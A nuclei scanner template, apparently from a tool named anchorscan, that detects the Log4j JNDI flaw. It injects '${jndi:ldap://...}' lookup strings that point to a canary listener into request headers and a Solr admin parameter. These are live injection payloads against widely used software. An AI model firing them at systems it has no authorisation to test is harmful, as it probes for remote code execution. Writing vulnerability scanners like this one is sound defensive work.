id: anchorscan-canary-log4j
info:
  name: Anchorscan Log4j canary callback
  author: anchorscan
  severity: high
  description: |
    Plants canary_ldap/canary_token into Log4j JNDI slots (headers + Solr admin action).
    The anchorscan process-local LDAP/HTTP canary listener emits the Finding on callback
    (confidence=verified); nuclei matchers are intentionally empty.
  tags:
    - canary
    - log4j
http:
  - method: GET
    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}/solr/admin/cores?action=${jndi:ldap://{{canary_ldap}}/{{canary_token}}}"
    headers:
      User-Agent: "${jndi:ldap://{{canary_ldap}}/{{canary_token}}}"
      X-Api-Version: "${jndi:ldap://{{canary_ldap}}/{{canary_token}}}"
    # Channel self-check: no matchers — finding comes from canary listener only.
